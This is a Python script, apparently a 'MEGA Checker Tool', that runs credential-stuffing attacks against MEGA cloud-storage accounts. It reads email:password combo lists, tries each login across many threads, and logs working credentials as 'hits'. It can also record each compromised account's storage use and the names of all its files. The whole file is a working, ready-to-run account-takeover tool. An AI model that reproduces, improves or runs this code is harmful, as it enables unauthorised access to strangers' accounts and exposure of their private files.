from os import name,system
from sys import stdout
from random import choice
from time import sleep
from threading import Thread,Lock,active_count,Timer
from mega import Mega
from beautifultable import BeautifulTable
import json
import requests

colors = {'white': "\033[1;37m", 'green': "\033[0;32m", 'red': "\033[0;31m", 'yellow': "\033[1;33m"}
version = 'v1.0.0'

def clear():
    if name == 'posix':
        system('clear')
    elif name in ('ce', 'nt', 'dos'):
        system('cls')
    else:
        print("\n") * 120

def setTitle(title:str):
    if name == 'posix':
        stdout.write(f"\x1b]2;{title}\x07")
    elif name in ('ce', 'nt', 'dos'):
        system(f'title {title}')
    else:
        stdout.write(f"\x1b]2;{title}\x07")

def printText(lock,bracket_color,text_in_bracket_color,text_in_bracket,text):
    lock.acquire()
    stdout.flush()
    text = text.encode('ascii','replace').decode()
    stdout.write(bracket_color+'['+text_in_bracket_color+text_in_bracket+bracket_color+'] '+bracket_color+text+'\n')
    lock.release()

def readFile(filename,method):
    with open(filename,method,encoding='utf8') as f:
        content = [line.strip('\n') for line in f]
        return content

def readJson(filename,method):
    with open(filename,method) as f:
        return json.load(f)


class Main:
    def __init__(self):
        setTitle(f'[MEGA Checker Tool] ^| {version}')
        clear()
        self.title = colors['white'] + """
                          ╔═════════════════════════════════════════════════════════════════════╗
                                                        ╔╦╗╔═╗╔═╗╔═╗
                                                        ║║║║╣ ║ ╦╠═╣
                                                        ╩ ╩╚═╝╚═╝╩ ╩
                          ╚═════════════════════════════════════════════════════════════════════╝                                         
        """
        print(self.title)
        self.lock = Lock()
        self.mega = Mega()
        self.hits = 0
        self.bads = 0
        self.retries = 0

        self.maxcpm = 0
        self.cpm = 0

        config = readJson('[Data]/configs.json','r')

        self.threads = config['threads']
        self.detailed_hits = config['detailed_hits']

        self.session = requests.Session()
    
    def titleUpdate(self):
        while True:
            setTitle(f'[MEGA Checker Tool] ^| {version} ^| CPM: {self.cpm} ^| HITS: {self.hits} ^| BADS: {self.bads} ^| RETRIES: {self.retries} ^| THREADS: {active_count() - 1}')
            sleep(0.1)

    def calculateCpm(self):
        self.cpm = self.maxcpm * 60
        self.maxcpm = 0
        Timer(1.0, self.calculateCpm).start()

    def worker(self,email,password):
        try:
            response = self.mega.login(email,password)
        except Exception:
            self.bads += 1
            printText(self.lock,colors['white'],colors['red'],'BAD', f'{email}:{password}')
            with open('[Data]/[Results]/bads.txt','a',encoding='utf8') as f:
                f.write(f'{email}:{password}\n')
        else:
            self.maxcpm += 1
            self.hits += 1
            printText(self.lock,colors['white'],colors['green'],'HIT', f'{email}:{password}')
            with open('[Data]/[Results]/hits.txt','a',encoding='utf8') as f:
                f.write(f'{email}:{password}\n')
            if self.detailed_hits == 1:
                space = response.get_storage_space(giga=True)
                used_space = f"{space['used']} GB"
                total_space = f"{space['total']} GB"
                user_data = response.get_files().items()
                table = BeautifulTable(180)
                table.columns.header = ['EMAIL','PASSWORD','USED SPACE','TOTAL SPACE','FILES']
                for key,value in user_data:
                    table.rows.append([email,password,used_space,total_space,value['a']['n']])
                with open('[Data]/[Results]/detailed_hits.txt','a',encoding='utf8') as f:
                    f.write(str(table)+'\n')

    def start(self):
        Thread(target=self.titleUpdate).start()
        self.calculateCpm()
        combos = readFile('[Data]/combos.txt','r')
        for combo in combos:
            run = True
            email = combo.split(':')[0]
            password = combo.split(':')[1]
            while run:
                if active_count() <= self.threads:
                    Thread(target=self.worker,args=(email,password)).start()
                    run = False

if __name__ == '__main__':
    main = Main()
    main.start()